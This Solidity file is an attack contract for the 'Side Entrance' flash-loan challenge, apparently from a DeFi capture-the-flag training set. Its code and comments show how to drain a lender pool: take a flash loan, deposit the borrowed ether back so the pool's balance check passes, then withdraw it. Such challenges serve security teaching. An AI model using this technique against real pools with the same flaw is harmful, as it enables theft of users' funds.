// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract SideEntrance_FlashLoanReceiver {
    receive() external payable {}

    function execute() external payable {
        ISideEntranceLenderPool(msg.sender).deposit{value: 1000 ether}();
    }

    // Calling 'flashLoan' function of the lender pool asking for 1k ether
    // lender contract transfers 1k ether by calling execute function of this contract
    // after receving 1k ether, we deposit 1k ether in the lender contract by calling 'deposit' function
    // once 'execute' callback is executed, lender contract makes sure that it's ether balance before
    // giving flashloan is same as after, we deceive the lender contract by depositing 1k ether,
    // (which was the balance of the lender contract before the flashloan)
    // our deposit of 1k ether makes us pass the last guard/ check of lender contract
    // we then withdraw our deposit of 1k ether, all in one tx
    function executeFlashloan(address lender, uint256 amount) external {
        ISideEntranceLenderPool(lender).flashLoan(amount);
        ISideEntranceLenderPool(lender).withdraw();
    }
}
